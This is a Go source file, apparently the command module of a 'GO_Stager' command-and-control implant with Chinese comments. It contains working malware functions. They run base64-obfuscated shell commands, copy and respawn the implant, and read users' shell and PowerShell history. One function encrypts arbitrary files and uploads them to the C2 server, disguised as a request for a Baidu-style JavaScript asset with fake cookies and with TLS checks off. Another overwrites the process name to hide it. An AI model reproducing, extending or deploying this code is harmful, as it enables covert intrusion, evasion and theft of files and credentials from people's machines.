package Command

import (
	"GO_Stager/AES"
	"GO_Stager/config"
	"GO_Stager/util"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"io"
	"io/fs"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"reflect"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/exp/rand"
)

type BeaconFile struct {
	Filename string `json:"Filename"`
	ID       string `json:"ID"`
}

func ShellExecute(command string) (string, error) {
	sh_path := "/bin/bash"
	_, err := os.Stat(sh_path)
	if err != nil {
		sh_path = "/bin/sh"
	}

	cmdstr, _ := util.Strim(command)
	base64Cmd := base64.StdEncoding.EncodeToString([]byte(cmdstr))
	final_cmd := util.Sprintf("echo %s | timeout 4 base64 -d | timeout %d %s", base64Cmd, 4, sh_path)

	cmd := exec.Command(sh_path, "-c", final_cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}
	return string(output), err
}
func SpawnCommand(targetPath string) (string, error) {
	if targetPath == "" {
		return "No file path specified.\n", nil
	}

	// 获取当前执行程序的路径
	currentExecutablePath, err := os.Executable()
	if err != nil {
		return "", util.Errorf("Can't get path from process: %v", err)
	}

	// 创建目标目录
	targetDirectory := filepath.Dir(targetPath)
	if _, err := os.Stat(targetDirectory); os.IsNotExist(err) {
		if err := os.MkdirAll(targetDirectory, os.ModePerm); err != nil {
			return "", util.Errorf("Error creating directory: %v", err)
		}
	}

	// 复制当前程序到目标路径
	err = copyFile(currentExecutablePath, targetPath)
	if err != nil {
		return "", util.Errorf("Error copying file: %v", err)
	}

	// 确保文件具有执行权限（仅限 Linux）
	if runtime.GOOS == "linux" {
		if err := os.Chmod(targetPath, 0755); err != nil {
			return "", util.Errorf("Error setting executable permission: %v", err)
		}
	}

	// 启动新进程
	cmd := exec.Command(targetPath)

	// 为新进程设置独立的进程组
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
	}

	// 启动子进程
	err = cmd.Start()
	if err != nil {
		return "", util.Errorf("Error starting process: %v", err)
	}

	return util.Sprintf("Spawned new process from %s to %s.\n", currentExecutablePath, targetPath), nil
}

func randString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
func IPConfig() (string, error) {
	var _out bytes.Buffer

	interfaces, err := net.Interfaces()
	if err != nil {
		return "", util.Errorf("failed to get network interfaces: %v", err)
	}

	if len(interfaces) == 0 {
		return "[-] No network interfaces detected\n", nil
	}

	for _, iface := range interfaces {
		_out.WriteString(util.Sprintf("Interface Name: %s\n", iface.Name))
		_out.WriteString(util.Sprintf("  Type: %s\n", iface.Flags.String()))
		_out.WriteString(util.Sprintf("  MAC Address: %s\n", iface.HardwareAddr))

		addrs, err := iface.Addrs()
		if err == nil && len(addrs) > 0 {
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					_out.WriteString(util.Sprintf("  IP Address: %s\n", v.IP.String()))
				case *net.IPAddr:
					_out.WriteString(util.Sprintf("  IP Address: %s\n", v.IP.String()))
				}
			}
		}

		_out.WriteString("\n")
	}

	return _out.String(), nil
}
func PSendFileAsync(filePath string) (string, error) {
	// 验证文件是否存在
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return "", util.Errorf("file does not exist: %v", err)
	}

	// 读取文件内容
	fileBytes, err := ioutil.ReadFile(filePath)
	if err != nil {
		return "", util.Errorf("could not read file: %v", err)
	}

	// 将文件内容转换为 Base64 字符串
	fileContentString := base64.StdEncoding.EncodeToString(fileBytes)

	// 加密文件内容
	encryptedContentString := AES.Encrypt(fileContentString)
	//util.Println("加密的文件内容：", encryptedContentString)
	// 创建 BeaconFile 对象用于 JSON 序列化
	beaconFile := BeaconFile{
		Filename: filepath.Base(filePath),
		ID:       config.HeaconId,
	}

	// 序列化 BeaconFile 对象为 JSON
	beaconFileJson, _ := json.Marshal(beaconFile)
	cookieValue := AES.Encrypt(string(beaconFileJson))

	// 忽略 TLS 验证
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// 创建 HTTP 客户端
	client := &http.Client{}

	// 配置 cookie
	cookieName := "BA_HECTORDD"
	cookieString := util.Sprintf("PSTM=1711006934;%s=%s;BAIDUID=A27BF1AF969360D43A3C5A256B111BC6:FG=1;", cookieName, cookieValue)

	// 创建随机路径
	rand.Seed(uint64(time.Now().UnixNano()))
	randomString := randString(10)
	requestPath := util.Sprintf("static/file/js/app.%s.js", randomString)
	uri := util.Sprintf("https://%s:%d/%s", config.ServerHost, config.ServerPort, requestPath)
	httpContent := bytes.NewBufferString(encryptedContentString)
	// 创建带有自定义头部的请求
	req, err := http.NewRequest("POST", uri, httpContent)
	if err != nil {
		return "", util.Errorf("could not create request: %v", err)
	}
	//util.Println("打印的Cookie:", cookieString)
	//util.Println("url:", uri)
	req.Header.Add("Cookie", cookieString)
	req.Header.Set("Content-Type", "text/plain; charset=utf-8")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0")
	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")

	// 发送请求
	resp, err := client.Do(req)
	if err != nil {
		return "", util.Errorf("upload failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", util.Errorf("server responded with status: %v", resp.Status)
	}

	return util.Sprintf("[*] File  %s upload success\n", filePath), nil
}

// CpCommand 模拟 cp 命令，复制文件
func CpCommand(command string) (string, error) {
	args := strings.Fields(command)

	if len(args) < 2 {
		return "Usage: Cp <source> <destination>\n", nil
	}

	sourcePath := args[0]
	destinationPath := args[1]

	// 检查源文件是否存在
	sourceFileStat, err := os.Stat(sourcePath)
	if os.IsNotExist(err) {
		return util.Sprintf("%s does not exist.\n", sourcePath), nil
	}

	// 确认源文件是一个普通文件
	if !sourceFileStat.Mode().IsRegular() {
		return util.Sprintf("%s is not a regular file.\n", sourcePath), nil
	}

	// 进行文件复制
	err = copyFile(sourcePath, destinationPath)
	if err != nil {
		return util.Sprintf("Error copying file: %v\n", err), nil
	}

	return util.Sprintf("[*] File copied from %s to %s\n", sourcePath, destinationPath), nil
}
func RemoveDirectory(dirPath string) (string, error) {
	err := os.Remove(dirPath)
	if err != nil {
		return "", err
	}
	return util.Sprintf("Directory '%s' has been removed successfully.", dirPath), nil
}

func GetHistoryFilePaths() ([]string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return nil, util.Errorf("unable to get current user: %w", err)
	}

	homeDir := currentUser.HomeDir
	var paths []string

	switch runtime.GOOS {
	case "windows":
		paths = []string{
			filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"),
		}
	case "linux", "darwin":
		paths = []string{
			filepath.Join(homeDir, ".bash_history"),
			filepath.Join(homeDir, ".zsh_history"),
			filepath.Join(homeDir, ".history"),
		}
	default:
		return nil, util.Errorf("unsupported OS platform")
	}

	return paths, nil
}

// ReadHistory reads history files and returns their content based on input.
func ReadHistory(input string) (string, error) {
	// Check if the input contains "-l"
	limitSize := !strings.Contains(input, "-l")

	paths, err := GetHistoryFilePaths()
	if err != nil {
		return "", err
	}

	var historyLines []string

	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			data, err := ioutil.ReadFile(path)
			if err != nil {
				return "", util.Errorf("error reading file %s: %w", path, err)
			}
			historyLines = append(historyLines, strings.Split(string(data), "\n")...)
		}
	}

	if len(historyLines) == 0 {
		return "No history files found.", nil
	}

	historyContent := strings.Join(historyLines, "\n")

	const maxSize = 2048 // 2KB
	if limitSize && len(historyContent) > maxSize {
		historyContent = historyContent[:maxSize] + "\n[Output truncated to 2KB]\n"
	}
	// util.Println("结果：", historyContent)
	return historyContent, nil
}
func CreateFile(input string) (string, error) {
	var filePath string
	var content string

	// Check if the input contains "--input:"
	if strings.Contains(input, "--input:") {
		parts := strings.SplitN(input, "--input:", 2)
		filePath = strings.TrimSpace(parts[0])
		content = strings.TrimSpace(parts[1])
	} else {
		filePath = strings.TrimSpace(input)
		content = ""
	}

	// Create the file
	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	// Write content to the file, if any
	if content != "" {
		_, err = file.WriteString(content)
		if err != nil {
			return "", err
		}
	}

	// Return the full path of the created file
	return util.Sprintf("File '%s' has been created successfully.", filePath), nil
}

// RemoveFile attempts to remove a file with the given path.
// Returns a success message if successful, or an error if not.
func RemoveFile(filePath string) (string, error) {
	err := os.Remove(filePath)
	if err != nil {
		return "", err
	}
	return util.Sprintf("File '%s' has been removed successfully.", filePath), nil
}
func CreateDirectory(dirPath string) (string, error) {
	err := os.Mkdir(dirPath, 0755)
	if err != nil {
		// os.IsExist checks if the error is because the directory already exists
		if os.IsExist(err) {
			return dirPath, nil
		}
		return "", err
	}
	return dirPath, nil
}

// copyFile 复制文件内容
func copyFile(sourcePath, destinationPath string) error {
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		return util.Errorf("could not open source file: %v", err)
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(destinationPath)
	if err != nil {
		return util.Errorf("could not create destination file: %v", err)
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return util.Errorf("file copy failed: %v", err)
	}

	return nil
}
func CD(command string) (string, error) {
	path := command
	currentDir, err := os.Getwd()
	if err != nil {
		return "", util.Errorf("Error getting current directory: %v", err)
	}

	// 如果路径为空，设置为用户主目录
	if path == "" {
		path, err = os.UserHomeDir()
		if err != nil {
			return "", util.Errorf("Error getting user home directory: %v", err)
		}
	}

	// 如果路径为 ".."，移动到上一级目录
	if path == ".." {
		parentDir := filepath.Dir(currentDir)
		if parentDir != "" {
			path = parentDir
		} else {
			path = currentDir
		}
	}

	// 将相对路径转换为绝对路径
	if !filepath.IsAbs(path) {
		path = filepath.Join(currentDir, path)
	}

	// 检查目录是否存在并更改当前目录
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return util.Sprintf("%s is not a valid path\n", path), nil
	}

	err = os.Chdir(path)
	if err != nil {
		return util.Sprintf("Error changing directory: %v\n", err), nil
	}

	newDir, err := os.Getwd()
	if err != nil {
		return "", util.Errorf("Error getting new current directory: %v", err)
	}

	return util.Sprintf("[*] Path set to %s\n", newDir), nil
}
func Find(command string) (string, error) {
	var searchDir, searchPattern string
	limitSize := true // 默认限制返回大小

	// 使用正则表达式解析参数，支持引号中的路径和文件名
	re := regexp.MustCompile(`-dir\s+"([^"]+)"|-name\s+"([^"]+)"|-dir\s+(\S+)|-name\s+(\S+)`)
	matches := re.FindAllStringSubmatch(command, -1)

	for _, match := range matches {
		if match[1] != "" {
			searchDir = match[1]
		}
		if match[2] != "" {
			searchPattern = match[2]
		}
		if match[3] != "" {
			searchDir = match[3]
		}
		if match[4] != "" {
			searchPattern = match[4]
		}
	}

	// 参数验证
	if searchDir == "" || searchPattern == "" {
		return "Usage: find -dir <path> -name <pattern>\n", nil
	}

	// 处理当前目录路径
	if searchDir == "./" {
		var err error
		searchDir, err = os.Getwd()
		if err != nil {
			return util.Sprintf("Error getting current directory: %v\n", err), nil
		}
	}

	if _, err := os.Stat(searchDir); os.IsNotExist(err) {
		return util.Sprintf("The specified path '%s' does not exist or is not a directory.\n", searchDir), nil
	}

	foundFiles := []string{}
	err := searchDirectory(searchDir, searchPattern, &foundFiles)
	if err != nil {
		return util.Sprintf("Error searching for files: %v\n", err), nil
	}

	if len(foundFiles) > 0 {
		result := strings.Join(foundFiles, "\n") + "\n"

		// 限制输出大小
		maxSize := 2048 // 默认最大返回大小为2KB
		if limitSize && len(result) > maxSize {
			return result[:maxSize] + "\n[Output truncated to 2KB]\n", nil
		}

		return result, nil
	}

	return util.Sprintf("No files found matching '%s' in '%s'.\n", searchPattern, searchDir), nil
}
func searchDirectory(path, pattern string, foundFiles *[]string) error {
	err := filepath.Walk(path, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			// 跳过无法访问的文件夹
			if os.IsPermission(err) {
				return nil
			}
			return err
		}
		if !info.IsDir() {
			matched, err := filepath.Match(pattern, info.Name())
			if err != nil {
				return err
			}
			if matched {
				*foundFiles = append(*foundFiles, path)
			}
		}
		return nil
	})
	return err
}

func CrossPlatformSetProcName(name string) string {

	modified := false

	for i := range os.Args {
		argvNstr := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[i]))
		argvN := (*[1 << 30]byte)(unsafe.Pointer(argvNstr.Data))[:argvNstr.Len]

		// pad name to match argv[0] length
		pad := argvNstr.Len - len(name)
		if pad > 0 {
			log.Printf("Padding %d of 0x00", pad)
			name += strings.Repeat("\x00", pad)
		}

		// Attempt to copy the name into argvN
		n := copy(argvN, name)
		if i > 0 {
			n = copy(argvN, []byte(strings.Repeat("\x00", argvNstr.Len)))
		}
		if n < len(argvN) {
			argvN[n] = 0
		}

		if i == 0 && n == len(name) {
			modified = true
		}
	}
	if modified {
		return "修改后的进程名: " + name
	}
	return "修改失败"
}

func Cat(command string) (string, error) {
	filePath := command
	limitSize := !strings.Contains(filePath, "-l")

	// 移除 `-l` 标记并修剪空格以获取实际的文件路径
	filePath = strings.Replace(filePath, "-l", "", -1)
	filePath = strings.TrimSpace(filePath)

	if filePath == "" {
		return "No file path specified.\n", nil
	}

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return util.Sprintf("%s does not exist.\n", filePath), nil
	}

	// 读取文件内容
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		errorMessage := util.Sprintf("Error reading file: %v\n", err)
		maxSize := 2048
		if len(errorMessage) > maxSize {
			return errorMessage[:maxSize] + "\n[Error message truncated to 2KB]\n", nil
		}
		return errorMessage, nil
	}

	contentStr := string(fileContent)
	maxSize := 2048 // 默认最大返回大小为2KB
	if limitSize && len(contentStr) > maxSize {
		return contentStr[:maxSize] + "\n[Output truncated to 2KB]\n", nil
	}
	return contentStr, nil
}

func ChangeSleep(args string) (string, error) {
	cmdstr, _ := util.Strim(args)
	timenew, _ := strconv.Atoi(cmdstr)
	util.Println(timenew)
	if timenew > 0 && timenew < 1000 {
		config.TimeOut = time.Duration(timenew) * time.Second
		return "修改成功, 新sleep时间: " + strconv.Itoa(timenew) + "秒", nil
	} else if timenew >= 1000 {
		config.TimeOut = time.Duration(timenew/1000) * time.Second
		return "修改成功, 新sleep时间: " + strconv.Itoa(timenew/1000) + "秒", nil
	}
	return "修改失败", nil
}

func GetIpConfig() (string, error) {
	var _out bytes.Buffer

	interfaces, err := net.Interfaces()
	if err != nil {
		return "", util.Errorf("failed to get network interfaces: %v", err)
	}

	if len(interfaces) == 0 {
		return "[-] No network interfaces detected\n", nil
	}

	for _, iface := range interfaces {
		_out.WriteString(util.Sprintf("Interface Name: %s\n", iface.Name))
		_out.WriteString(util.Sprintf("  Type: %s\n", iface.Flags.String()))
		_out.WriteString(util.Sprintf("  MAC Address: %s\n", iface.HardwareAddr))

		addrs, err := iface.Addrs()
		if err == nil && len(addrs) > 0 {
			for _, addr := range addrs {
				switch v := addr.(type) {
				case *net.IPNet:
					_out.WriteString(util.Sprintf("  IP Address: %s\n", v.IP.String()))
				case *net.IPAddr:
					_out.WriteString(util.Sprintf("  IP Address: %s\n", v.IP.String()))
				}
			}
		}

		_out.WriteString("\n")
	}

	return _out.String(), nil
}

func NetStat() (string, error) {
	return parseTcpFile()
}

func Getpwd() (string, error) {
	return os.Getwd()
}

func Ps() (string, error) {
	return ps()
}
